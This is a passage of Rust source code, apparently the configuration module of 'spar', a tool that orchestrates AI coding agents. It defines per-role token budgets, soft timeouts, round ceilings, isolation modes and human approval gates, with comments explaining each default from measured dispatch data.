use crate::bus::MessageBudget;
use crate::paths::SparPaths;
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};

/// User/project config. Project `spar.toml` field-overlays user config.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default = "default_max_agents")]
    pub max_agents: u32,
    #[serde(default)]
    pub default_backend: crate::cli::Backend,
    #[serde(default)]
    pub isolation: IsolationMode,
    #[serde(default)]
    pub worktree: WorktreeConfig,
    #[serde(default)]
    pub providers: ProviderConfig,
    #[serde(default)]
    pub ship: ShipConfig,
    #[serde(default)]
    pub timeouts: TimeoutConfig,
    /// Per-role soft budget on one dispatch's billed tokens (O50).
    #[serde(default)]
    pub budget: BudgetConfig,
    #[serde(default)]
    pub suite: SuiteConfig,
    /// Provider assignment by role. Priority 9 consumes it to key the fleet.
    #[serde(default)]
    pub roles: RolesConfig,
    /// Reviewer verdict / acceptance gate policy.
    #[serde(default)]
    pub review: ReviewConfig,
    /// Pre-coding acceptance tests (plan flow). Separate from suite channel.
    #[serde(default)]
    pub spec: SpecConfig,
    /// Round-loop economy: the ceiling on re-dispatch and the carry-forward budget.
    #[serde(default)]
    pub rounds: RoundsConfig,
    #[serde(default)]
    pub gates: GatesConfig,
    #[serde(default)]
    pub autonomy: AutonomyLevel,
    #[serde(default)]
    pub message_budget: MessageBudget,
    #[serde(default)]
    pub auto_cleanup: bool,
    /// Delete a run's own `target/` / `node_modules` when its orchestrator finishes.
    /// On by default: it destroys nothing a build cannot regenerate, and build output is
    /// the overwhelming majority of what spar leaves on disk.
    #[serde(default = "default_true")]
    pub auto_reclaim: bool,
    /// Auto-archive finished runs idle at least this long, at launch. `"0"` / `"off"`
    /// disables. Only `done` / `plan_rejected` — never a run parked at a gate.
    #[serde(default = "default_auto_archive_after")]
    pub auto_archive_after: String,
    #[serde(default)]
    pub model_select: ModelSelectConfig,
    /// Optional external `@human` notifier. Empty by default — the TUI alert panel
    /// is the always-on baseline; this is the operator's opt-in push sink.
    #[serde(default)]
    pub notify: NotifyConfig,
}

/// Operator-configured external sink for `@human` / `Blocked` alerts. spar ships no
/// notifier of its own; set exactly one of these to wire your own (ntfy, Slack, a
/// script). Neither set ⇒ only the TUI panel fires.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct NotifyConfig {
    /// Shell command spar runs on each alert (summary on `$1`, message JSON on stdin).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    /// URL spar POSTs the message JSON to on each alert.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub webhook: Option<String>,
}

/// vals-backed dynamic model selection (see DECISIONS MS*).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModelSelectConfig {
    #[serde(default = "default_model_select_source")]
    pub source: String,
    #[serde(default = "default_model_select_benches")]
    pub benches: Vec<String>,
    /// Cache TTL seconds (default 24h).
    #[serde(default = "default_model_select_ttl")]
    pub cache_ttl_secs: u64,
    /// Provider allow patterns (`cli:*`, `api:openai`, `*`). Empty = all mappable.
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub profiles: std::collections::HashMap<String, crate::model_select::ProfileWeights>,
    /// role name → benchmark-profile name (distinct from top-level `[roles]`, which
    /// assigns *providers*).
    #[serde(default)]
    pub role_profiles: std::collections::HashMap<String, String>,
    /// Auto-refresh a stale/missing vals cache during `--select` (default true). Set
    /// false to disable spar's network fetch: a stale cache is used as-is and a missing
    /// one errors instead of fetching. `spar model refresh` still works either way.
    #[serde(default = "default_model_select_auto_refresh")]
    pub auto_refresh: bool,
}

impl Default for ModelSelectConfig {
    fn default() -> Self {
        Self {
            source: default_model_select_source(),
            benches: default_model_select_benches(),
            cache_ttl_secs: default_model_select_ttl(),
            allow: Vec::new(),
            profiles: crate::model_select::default_profiles(),
            role_profiles: default_model_select_role_profiles(),
            auto_refresh: default_model_select_auto_refresh(),
        }
    }
}

impl ModelSelectConfig {
    pub fn resolved_profiles(
        &self,
    ) -> std::collections::HashMap<String, crate::model_select::ProfileWeights> {
        let mut m = crate::model_select::default_profiles();
        for (k, v) in &self.profiles {
            m.insert(k.clone(), v.clone());
        }
        m
    }

    pub fn role_profile(&self, role: &str) -> &str {
        self.role_profiles
            .get(role)
            .map(|s| s.as_str())
            .unwrap_or(match role {
                "planner" | "plan_critic" => "best",
                "tester" | "test_author" => "fast",
                "reviewer" => "value",
                _ => "value",
            })
    }

    pub fn min_accuracy_for(&self, profile: &str) -> Option<f64> {
        self.resolved_profiles()
            .get(profile)
            .and_then(|p| p.min_accuracy)
    }
}

fn default_model_select_source() -> String {
    "vals".into()
}

fn default_model_select_benches() -> Vec<String> {
    vec!["swebench".into()]
}

fn default_model_select_ttl() -> u64 {
    86400
}

fn default_model_select_auto_refresh() -> bool {
    true
}

fn default_model_select_role_profiles() -> std::collections::HashMap<String, String> {
    let mut m = std::collections::HashMap::new();
    m.insert("planner".into(), "best".into());
    m.insert("plan_critic".into(), "best".into());
    m.insert("implementer".into(), "value".into());
    m.insert("reviewer".into(), "value".into());
    m.insert("tester".into(), "fast".into());
    m.insert("test_author".into(), "fast".into());
    m
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IsolationMode {
    None,
    #[default]
    Worktree,
    #[serde(rename = "worktree+db")]
    WorktreeDb,
    #[serde(rename = "worktree+bwrap")]
    WorktreeBwrap,
}

/// How aggressively spar auto-passes human gates.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AutonomyLevel {
    /// Require human at plan / winner / ship (safe default).
    #[default]
    Manual,
    /// Auto-approve plan; still gate winner + ship.
    Semi,
    /// Auto plan + winner; ship still requires confirm unless ship.auto_confirm.
    High,
    /// Auto plan + winner + ship.
    Full,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GatesConfig {
    /// Require plan approval gate (can be skipped by autonomy).
    #[serde(default = "default_true")]
    pub plan: bool,
    #[serde(default = "default_true")]
    pub winner: bool,
    #[serde(default = "default_true")]
    pub ship: bool,
}

impl Default for GatesConfig {
    fn default() -> Self {
        Self {
            plan: true,
            winner: true,
            ship: true,
        }
    }
}

fn default_true() -> bool {
    true
}

/// Two weeks: long enough that a run you might still open is untouched, short enough that
/// a busy project's listing does not become 69 rows of finished work.
fn default_auto_archive_after() -> String {
    "14d".into()
}

/// Spellings that turn auto-archiving off.
pub fn is_archive_off(v: &str) -> bool {
    let v = v.trim();
    v.is_empty() || v == "0" || v.eq_ignore_ascii_case("off") || v.eq_ignore_ascii_case("never")
}

impl Config {
    /// How long a finished run stays listed before auto-archiving. `None` = never.
    pub fn auto_archive_idle(&self) -> Option<std::time::Duration> {
        if is_archive_off(&self.auto_archive_after) {
            return None;
        }
        // A parsed zero is off too. Otherwise `"0"` disables and `"0d"` archives every
        // finished run the instant it finishes — two spellings of zero, opposite meanings.
        crate::util::parse_duration(&self.auto_archive_after)
            .ok()
            .filter(|d| !d.is_zero())
    }
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ProviderConfig {
    #[serde(default = "default_provider_order")]
    pub order: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ShipConfig {
    #[serde(default)]
    pub auto_confirm: bool,
}

/// Per-role **soft** budget on one dispatch's billed tokens, plus how often a slot past
/// it is nudged again (O50).
///
/// Nothing here kills anything. Of the 21 dispatches in the local corpus that billed over
/// 100M tokens, 18 exited `0`: the tail is expensive-but-working slots, not runaways, and
/// a cap would throw away finished implementations and force a re-dispatch, which is the
/// most expensive thing spar does. Crossing a budget only tells the slot to land its
/// artifact and say what it did not reach.
///
/// Sized at each role's measured p90 across 1794 real dispatches, because the
/// distributions differ by more than 10x: one global number low enough to notice an
/// implementer overrun would nudge a reviewer at p50. Keys are the canonical role names,
/// same vocabulary as `[roles]`; values are billed tokens, and `0` silences one role's
/// token nudges without disabling the rest.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BudgetConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    /// Renudge every this fraction of the role budget past it, so a slot at 2x its budget
    /// has been told five times rather than once. `<= 0.0` nudges exactly once.
    #[serde(default = "default_nudge_fraction")]
    pub nudge_fraction: f64,
    #[serde(default = "default_budget_planner")]
    pub planner: u64,
    #[serde(default = "default_budget_plan_critic")]
    pub plan_critic: u64,
    #[serde(default = "default_budget_test_author")]
    pub test_author: u64,
    #[serde(default = "default_budget_implementer")]
    pub implementer: u64,
    #[serde(default = "default_budget_reviewer")]
    pub reviewer: u64,
    #[serde(default = "default_budget_tester")]
    pub tester: u64,
    /// Roles with no measured distribution: `ranker`, `peer`, `reconciler`.
    #[serde(default = "default_budget_other")]
    pub other: u64,
}

impl Default for BudgetConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            nudge_fraction: default_nudge_fraction(),
            planner: default_budget_planner(),
            plan_critic: default_budget_plan_critic(),
            test_author: default_budget_test_author(),
            implementer: default_budget_implementer(),
            reviewer: default_budget_reviewer(),
            tester: default_budget_tester(),
            other: default_budget_other(),
        }
    }
}

impl BudgetConfig {
    /// This role's soft budget in billed tokens. `0` means no token nudges for it.
    pub fn tokens_for(&self, role: crate::state::SlotRole) -> u64 {
        use crate::state::SlotRole;
        if !self.enabled {
            return 0;
        }
        match role {
            SlotRole::Planner => self.planner,
            SlotRole::PlanCritic => self.plan_critic,
            SlotRole::TestAuthor => self.test_author,
            SlotRole::Implementer => self.implementer,
            SlotRole::Reviewer => self.reviewer,
            SlotRole::Tester => self.tester,
            SlotRole::Ranker | SlotRole::Peer | SlotRole::Reconciler => self.other,
        }
    }

    /// Tokens between one nudge and the next past the budget. Never zero while the role
    /// has a budget, or the watcher would renudge on every poll.
    pub fn nudge_step(&self, role: crate::state::SlotRole) -> u64 {
        let budget = self.tokens_for(role);
        if budget == 0 || self.nudge_fraction <= 0.0 {
            return u64::MAX;
        }
        ((budget as f64) * self.nudge_fraction).round().max(1.0) as u64
    }
}

/// Every 20% of the role budget. The budgets are p90s, so the first nudge already selects
/// the slowest tenth of dispatches; 20% steps escalate a genuine overrun (five nudges by
/// 2x budget) without spending a turn on a slot that is only a little over.
fn default_nudge_fraction() -> f64 {
    0.2
}

fn default_budget_planner() -> u64 {
    8_000_000
}

fn default_budget_plan_critic() -> u64 {
    6_000_000
}

fn default_budget_test_author() -> u64 {
    20_000_000
}

fn default_budget_implementer() -> u64 {
    60_000_000
}

fn default_budget_reviewer() -> u64 {
    12_000_000
}

fn default_budget_tester() -> u64 {
    6_000_000
}

/// No corpus of its own; the reviewer's p90 is the closest measured neighbour.
fn default_budget_other() -> u64 {
    12_000_000
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeoutConfig {
    /// **Soft** since O50: the point where a slot starts being asked to land its work,
    /// not the point where it is killed. `hard_ceiling_multiple` is the kill.
    #[serde(default = "default_slot_timeout_secs")]
    pub slot_secs: u64,
    /// Reviewer wall clock (diff-focused). Defaults to `slot_secs`. Also soft.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub review_secs: Option<u64>,
    /// The kill, as a multiple of whichever soft budget the role draws. Deliberately far
    /// above it: this is a backstop against a hung process, not a second budget, and a
    /// slot killed here loses whatever it has not written down. Below `1.0` clamps to
    /// `1.0`, which restores the pre-O50 behaviour of killing at the soft budget.
    #[serde(default = "default_hard_ceiling_multiple")]
    pub hard_ceiling_multiple: f64,
    /// Renudge cadence past the soft budget. `0` nudges exactly once.
    #[serde(default = "default_time_nudge_secs")]
    pub nudge_every_secs: u64,
    /// Running slot with no log output for this long ⇒ `stalled` in status/TUI.
    /// `0` disables the stall flag (last_log_at still reported).
    #[serde(default = "default_stall_warn_secs")]
    pub stall_warn_secs: u64,
    #[serde(default = "default_wait_timeout")]
    pub wait: String,
}

impl Default for TimeoutConfig {
    fn default() -> Self {
        Self {
            slot_secs: default_slot_timeout_secs(),
            review_secs: None,
            hard_ceiling_multiple: default_hard_ceiling_multiple(),
            nudge_every_secs: default_time_nudge_secs(),
            stall_warn_secs: default_stall_warn_secs(),
            wait: default_wait_timeout(),
        }
    }
}

fn default_stall_warn_secs() -> u64 {
    300
}

/// 3x the soft budget. The corpus cannot say what a legitimately long dispatch needs,
/// because every observed maximum is the project's own kill (180.0m under payforge's
/// 10800s, 90.0m under biddesk's 5400s): the distribution is censored at exactly the
/// number under review. So the ceiling is set where it cannot plausibly be the thing that
/// ends real work, and the recurring nudges do the actual bounding.
fn default_hard_ceiling_multiple() -> f64 {
    3.0
}

/// Ten minutes. Long enough that a slot mid-build is not interrupted every turn, short
/// enough that a slot drifting past 3x its budget has been asked about it a couple of
/// dozen times before the ceiling takes it.
fn default_time_nudge_secs() -> u64 {
    600
}

impl TimeoutConfig {
    pub fn review_secs(&self) -> u64 {
        self.review_secs.unwrap_or(self.slot_secs)
    }

    pub fn hard_multiple(&self) -> f64 {
        self.hard_ceiling_multiple.max(1.0)
    }
}

/// Slot worktree policy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorktreeConfig {
    /// Reap at-rest runs whose branches are already in their base before cutting new slot
    /// worktrees. On by default, unlike `auto_cleanup`: that one deletes resumable work on
    /// a phase check, this one only deletes work git says is already in the base branch.
    #[serde(default = "default_true")]
    pub auto_cleanup_merged: bool,
}

impl Default for WorktreeConfig {
    fn default() -> Self {
        Self {
            auto_cleanup_merged: true,
        }
    }
}

/// Dedicated full-suite channel (cheap/dumb model). Separate from smart review/impl.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuiteConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    #[serde(default = "default_suite_timeout_secs")]
    pub timeout_secs: u64,
    /// Shell commands spar runs itself, in order, instead of dispatching a `tester`
    /// slot. Non-empty means the gate is decided by exit codes rather than by a model
    /// reading its own log. Empty keeps the agent tester, which is what discovers the
    /// commands in a repo that has not declared them.
    #[serde(default)]
    pub command: Vec<String>,
}

impl Default for SuiteConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            timeout_secs: default_suite_timeout_secs(),
            command: Vec::new(),
        }
    }
}

impl SuiteConfig {
    /// Deterministic gate: spar runs the commands, no tester slot is spawned.
    pub fn is_builtin(&self) -> bool {
        self.enabled && !self.command.is_empty()
    }
}

fn default_suite_timeout_secs() -> u64 {
    7200
}

/// Provider assignment by role (Priority 8). Values are `@model`-capable provider ref
/// strings validated by `ProviderRef::parse`. `reviewer` is a list (a review fleet); an
/// empty list is "unset". Distinct from `[model_select.role_profiles]`, which maps roles
/// to *benchmark profiles*, not providers. Keys are the canonical `SlotRole` config keys.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RolesConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub planner: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub plan_critic: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub implementer: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub reviewer: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tester: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub test_author: Option<String>,
}

impl RolesConfig {
    /// Priority 9 consumes this for the role-key invariant check.
    #[allow(dead_code)]
    pub fn is_empty(&self) -> bool {
        self.planner.is_none()
            && self.plan_critic.is_none()
            && self.implementer.is_none()
            && self.reviewer.is_empty()
            && self.tester.is_none()
            && self.test_author.is_none()
    }

    /// Validate every assigned ref through `ProviderRef::parse`, naming the offending
    /// role key on failure. Keeps `init_slot_model`'s `.expect()` unreachable from config.
    fn validate(&self) -> Result<()> {
        let singles = [
            ("planner", &self.planner),
            ("plan_critic", &self.plan_critic),
            ("implementer", &self.implementer),
            ("tester", &self.tester),
            ("test_author", &self.test_author),
        ];
        for (key, val) in singles {
            if let Some(v) = val {
                crate::provider_ref::ProviderRef::parse(v)
                    .with_context(|| format!("invalid provider in [roles].{key}: {v:?}"))?;
            }
        }
        for v in &self.reviewer {
            crate::provider_ref::ProviderRef::parse(v)
                .with_context(|| format!("invalid provider in [roles].reviewer: {v:?}"))?;
        }
        Ok(())
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
struct RolesConfigFile {
    planner: Option<String>,
    plan_critic: Option<String>,
    implementer: Option<String>,
    reviewer: Option<Vec<String>>,
    tester: Option<String>,
    test_author: Option<String>,
}

/// Acceptance gate policy. Review *timeouts* stay at `[timeouts].review_secs`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReviewConfig {
    /// When true (default), an `unverified` acceptance criterion blocks the ship the
    /// same way a `fail` does. A criterion the reviewer never mentioned always blocks,
    /// regardless of this setting.
    #[serde(default = "default_true")]
    pub require_all_criteria: bool,
}

impl Default for ReviewConfig {
    fn default() -> Self {
        Self {
            require_all_criteria: true,
        }
    }
}

/// Pre-coding test-author channel (plan → before human gate).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpecConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    #[serde(default = "default_spec_timeout_secs")]
    pub timeout_secs: u64,
}

impl Default for SpecConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            timeout_secs: default_spec_timeout_secs(),
        }
    }
}

/// 60 minutes, sized the same way `default_slot_timeout_secs` was: just above the role's
/// measured p90 (test_author 45.8m over 106 dispatches), which selects roughly its slowest
/// 5% for nudging. At the old 1800 the *ceiling* (3x) landed on 5400s against an observed
/// max of 89.6m, i.e. **zero headroom**, and test_author is the worst role to lose to a
/// kill: its artifact is the frozen acceptance contract, so killing it wastes the plan and
/// the critique above it too. At 3600 the ceiling moves to 10800s, about 90 minutes clear
/// of anything observed. See O51 for the headroom table across every role.
fn default_spec_timeout_secs() -> u64 {
    3600
}

/// Round-loop economy (O52).
///
/// A round is a **cold** re-dispatch: `run_captured` truncates the log, the slot starts
/// with an empty context and re-derives the repo before it does any new work. Measured
/// over 197 runs, one fix round is a 6.6x median run cost (10.8M -> 70.9M tokens) and
/// runs with at least one are 65% of all spend.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RoundsConfig {
    /// Highest `state.round` a run may reach. On reaching it the run escalates to the
    /// `awaiting_round_extension` human gate (exit 2) instead of minting another round;
    /// `spar implement --run <id> --max-rounds <N>` is what raises it. `0` disables the
    /// ceiling, which is what the corpus of rounds 9, 13, 17, 19, 20, 26 and 34 looked
    /// like. Frozen onto the run at creation, so editing `spar.toml` cannot move the
    /// ceiling of a run already in flight (O27).
    #[serde(default = "default_max_rounds")]
    pub max: u32,
    /// Hard cap on the carry-forward brief seeded into the next round's implementer
    /// prompt. The brief exists to keep the context floor low, so it is truncated, not
    /// grown: `plan.md` is already a median 30k chars and is inlined every round.
    #[serde(default = "default_carry_forward_chars")]
    pub carry_forward_chars: usize,
}

impl Default for RoundsConfig {
    fn default() -> Self {
        Self {
            max: default_max_rounds(),
            carry_forward_chars: default_carry_forward_chars(),
        }
    }
}

/// A plan round plus an implement round plus the whole 3-fix budget is round 5, which
/// covers 95% of the measured corpus (188 of 197 runs used 3 fix rounds or fewer). 8
/// leaves room for one replan or one implementer rotation on top of that and still stops
/// well short of the tail where spend explodes with nothing to show for it.
pub fn default_max_rounds() -> u32 {
    8
}

fn default_carry_forward_chars() -> usize {
    4000
}

fn default_max_agents() -> u32 {
    4
}

fn default_provider_order() -> Vec<String> {
    vec!["cli:claude".into(), "cli:grok".into(), "cli:agy".into()]
}

/// 90 minutes. The old 1800 predated any measurement and contradicted what
/// `templates/implementer.md` told agents; measured over 1869 real dispatches, 38.7% of
/// implementer dispatches run longer than 30 minutes (p50 22.9m, p90 76.8m), so the old
/// default was a kill sitting between the median implementer and its p90. At 5400 the
/// threshold selects the slowest 6.6% of implementers, which is what a soft budget is
/// for, and it matches what every project on this box had already overridden it to.
fn default_slot_timeout_secs() -> u64 {
    5400
}

/// Must clear the longest legitimate dispatch, or `spar wait` reports a healthy run as
/// stuck (exit 3) and the documented reaction to 3 is `spar stop`: the default would be
/// telling operators to kill working implementers. The implementer's hard ceiling is
/// `slot_secs` x `hard_ceiling_multiple` = 4.5h (O50), and a run is a fleet plus fix
/// rounds, not one dispatch, so this sits above it rather than on it.
fn default_wait_timeout() -> String {
    "8h".into()
}

impl Default for Config {
    fn default() -> Self {
        Self {
            max_agents: default_max_agents(),
            default_backend: crate::cli::Backend::Auto,
            isolation: IsolationMode::default(),
            worktree: WorktreeConfig::default(),
            providers: ProviderConfig {
                order: default_provider_order(),
            },
            ship: ShipConfig::default(),
            timeouts: TimeoutConfig::default(),
            budget: BudgetConfig::default(),
            suite: SuiteConfig::default(),
            roles: RolesConfig::default(),
            review: ReviewConfig::default(),
            spec: SpecConfig::default(),
            rounds: RoundsConfig::default(),
            gates: GatesConfig::default(),
            autonomy: AutonomyLevel::default(),
            message_budget: MessageBudget::default(),
            auto_cleanup: false,
            auto_reclaim: true,
            auto_archive_after: default_auto_archive_after(),
            model_select: ModelSelectConfig::default(),
            notify: NotifyConfig::default(),
        }
    }
}

impl Config {
    /// Whether plan approval can be auto-applied.
    pub fn auto_plan(&self) -> bool {
        !self.gates.plan
            || matches!(
                self.autonomy,
                AutonomyLevel::Semi | AutonomyLevel::High | AutonomyLevel::Full
            )
    }

    pub fn auto_winner(&self) -> bool {
        !self.gates.winner || matches!(self.autonomy, AutonomyLevel::High | AutonomyLevel::Full)
    }

    pub fn auto_ship(&self) -> bool {
        !self.gates.ship || self.ship.auto_confirm || matches!(self.autonomy, AutonomyLevel::Full)
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ConfigFile {
    max_agents: Option<u32>,
    default_backend: Option<crate::cli::Backend>,
    isolation: Option<IsolationMode>,
    worktree: Option<WorktreeConfigFile>,
    providers: Option<ProviderConfigFile>,
    ship: Option<ShipConfigFile>,
    timeouts: Option<TimeoutConfigFile>,
    budget: Option<BudgetConfigFile>,
    suite: Option<SuiteConfigFile>,
    roles: Option<RolesConfigFile>,
    review: Option<ReviewConfigFile>,
    spec: Option<SpecConfigFile>,
    rounds: Option<RoundsConfigFile>,
    gates: Option<GatesConfigFile>,
    autonomy: Option<AutonomyLevel>,
    message_budget: Option<MessageBudget>,
    auto_cleanup: Option<bool>,
    auto_reclaim: Option<bool>,
    auto_archive_after: Option<String>,
    model_select: Option<ModelSelectConfigFile>,
    notify: Option<NotifyConfigFile>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct WorktreeConfigFile {
    auto_cleanup_merged: Option<bool>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct NotifyConfigFile {
    command: Option<String>,
    webhook: Option<String>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ModelSelectConfigFile {
    source: Option<String>,
    benches: Option<Vec<String>>,
    cache_ttl_secs: Option<u64>,
    allow: Option<Vec<String>>,
    profiles: Option<std::collections::HashMap<String, crate::model_select::ProfileWeights>>,
    role_profiles: Option<std::collections::HashMap<String, String>>,
    auto_refresh: Option<bool>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ProviderConfigFile {
    order: Option<Vec<String>>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ShipConfigFile {
    auto_confirm: Option<bool>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct BudgetConfigFile {
    enabled: Option<bool>,
    nudge_fraction: Option<f64>,
    planner: Option<u64>,
    plan_critic: Option<u64>,
    test_author: Option<u64>,
    implementer: Option<u64>,
    reviewer: Option<u64>,
    tester: Option<u64>,
    other: Option<u64>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct TimeoutConfigFile {
    slot_secs: Option<u64>,
    review_secs: Option<u64>,
    hard_ceiling_multiple: Option<f64>,
    nudge_every_secs: Option<u64>,
    stall_warn_secs: Option<u64>,
    wait: Option<String>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct SuiteConfigFile {
    enabled: Option<bool>,
    timeout_secs: Option<u64>,
    command: Option<Vec<String>>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct ReviewConfigFile {
    require_all_criteria: Option<bool>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct SpecConfigFile {
    enabled: Option<bool>,
    timeout_secs: Option<u64>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct RoundsConfigFile {
    max: Option<u32>,
    carry_forward_chars: Option<usize>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct GatesConfigFile {
    plan: Option<bool>,
    winner: Option<bool>,
    ship: Option<bool>,
}

impl Config {
    pub fn load(project_root: &Path) -> Result<Self> {
        let mut cfg = Self::default();
        if let Some(user_path) = user_config_path() {
            if user_path.is_file() {
                cfg.apply_file(&load_file(&user_path)?, Trust::User)?;
            }
        }
        let project_path = project_root.join("spar.toml");
        if project_path.is_file() {
            cfg.apply_file(&load_file(&project_path)?, Trust::Project)?;
        }
        Ok(cfg)
    }

    /// The config a run is bound to. `spar.toml` is one mutable file per project, read
    /// by every process, so a second agent editing it would otherwise change the fleet,
    /// timeouts and ship-gate strictness of a run already in flight. A run reads its own
    /// snapshot and nothing else; `implement --reload-config` is the only way to replace
    /// it. Runs created before snapshots existed fall back to the live file.
    pub fn for_run(paths: &SparPaths, run_id: &str) -> Result<Self> {
        let snap = paths.run_config_file(run_id);
        if snap.is_file() {
            let text = std::fs::read_to_string(&snap)
                .with_context(|| format!("read run config {}", snap.display()))?;
            return serde_json::from_str(&text)
                .with_context(|| format!("parse run config {}", snap.display()));
        }
        Self::load(&paths.project_root)
    }

    pub fn save_snapshot(&self, paths: &SparPaths, run_id: &str) -> Result<()> {
        paths.ensure_run_dirs(run_id)?;
        let path = paths.run_config_file(run_id);
        std::fs::write(&path, serde_json::to_string_pretty(self)?)
            .with_context(|| format!("write run config {}", path.display()))
    }

    /// Overlay `--role <role>=<provider>` onto `[roles]`, so a run's fleet can be chosen
    /// per role without writing the project's shared `spar.toml` at all. Repeating
    /// `--role reviewer=…` builds the reviewer list and replaces the file's, rather than
    /// appending to it — otherwise a CLI panel could never be smaller than the file's.
    pub fn apply_role_overrides(&mut self, assignments: &[String]) -> Result<()> {
        if assignments.is_empty() {
            return Ok(());
        }
        let mut reviewers = Vec::new();
        for raw in assignments {
            let (role, provider) = raw
                .split_once('=')
                .ok_or_else(|| anyhow::anyhow!("--role expects <role>=<provider>, got {raw:?}"))?;
            let (role, provider) = (role.trim(), provider.trim());
            if provider.is_empty() {
                anyhow::bail!("--role {role}= has no provider");
            }
            let slot = crate::state::SlotRole::from_config_key(role).ok_or_else(|| {
                anyhow::anyhow!(
                    "--role {role}: unknown role (planner, plan_critic, implementer, \
                     reviewer, tester, test_author)"
                )
            })?;
            match slot {
                crate::state::SlotRole::Planner => self.roles.planner = Some(provider.into()),
                crate::state::SlotRole::PlanCritic => {
                    self.roles.plan_critic = Some(provider.into())
                }
                crate::state::SlotRole::Implementer => {
                    self.roles.implementer = Some(provider.into())
                }
                crate::state::SlotRole::Tester => self.roles.tester = Some(provider.into()),
                crate::state::SlotRole::TestAuthor => {
                    self.roles.test_author = Some(provider.into())
                }
                crate::state::SlotRole::Reviewer => reviewers.push(provider.to_string()),
                other => anyhow::bail!(
                    "--role {}: not assignable (it is derived by the workflow)",
                    other.as_config_key()
                ),
            }
        }
        if !reviewers.is_empty() {
            self.roles.reviewer = reviewers;
        }
        self.roles.validate()
    }

    fn apply_file(&mut self, file: &ConfigFile, trust: Trust) -> Result<()> {
        if let Some(v) = file.max_agents {
            self.max_agents = v;
        }
        if let Some(v) = file.default_backend {
            self.default_backend = v;
        }
        if let Some(v) = file.isolation {
            self.isolation = v;
        }
        if let Some(w) = &file.worktree {
            if let Some(v) = w.auto_cleanup_merged {
                self.worktree.auto_cleanup_merged = v;
            }
        }
        if let Some(p) = &file.providers {
            if let Some(order) = &p.order {
                self.providers.order = order.clone();
            }
        }
        if let Some(s) = &file.ship {
            if let Some(v) = s.auto_confirm {
                self.ship.auto_confirm = v;
            }
        }
        if let Some(t) = &file.timeouts {
            if let Some(v) = t.slot_secs {
                self.timeouts.slot_secs = v;
            }
            if let Some(v) = t.review_secs {
                self.timeouts.review_secs = Some(v);
            }
            if let Some(v) = t.hard_ceiling_multiple {
                self.timeouts.hard_ceiling_multiple = v;
            }
            if let Some(v) = t.nudge_every_secs {
                self.timeouts.nudge_every_secs = v;
            }
            if let Some(v) = t.stall_warn_secs {
                self.timeouts.stall_warn_secs = v;
            }
            if let Some(v) = &t.wait {
                self.timeouts.wait = v.clone();
            }
        }
        if let Some(b) = &file.budget {
            if let Some(v) = b.enabled {
                self.budget.enabled = v;
            }
            if let Some(v) = b.nudge_fraction {
                self.budget.nudge_fraction = v;
            }
            if let Some(v) = b.planner {
                self.budget.planner = v;
            }
            if let Some(v) = b.plan_critic {
                self.budget.plan_critic = v;
            }
            if let Some(v) = b.test_author {
                self.budget.test_author = v;
            }
            if let Some(v) = b.implementer {
                self.budget.implementer = v;
            }
            if let Some(v) = b.reviewer {
                self.budget.reviewer = v;
            }
            if let Some(v) = b.tester {
                self.budget.tester = v;
            }
            if let Some(v) = b.other {
                self.budget.other = v;
            }
        }
        if let Some(s) = &file.suite {
            if let Some(v) = s.enabled {
                self.suite.enabled = v;
            }
            if let Some(v) = s.timeout_secs {
                self.suite.timeout_secs = v;
            }
            if let Some(v) = &s.command {
                if let Some(bad) = v.iter().position(|c| c.trim().is_empty()) {
                    anyhow::bail!("[suite].command[{bad}] is empty");
                }
                self.suite.command = v.clone();
            }
        }
        if let Some(r) = &file.roles {
            if let Some(v) = &r.planner {
                self.roles.planner = Some(v.clone());
            }
            if let Some(v) = &r.plan_critic {
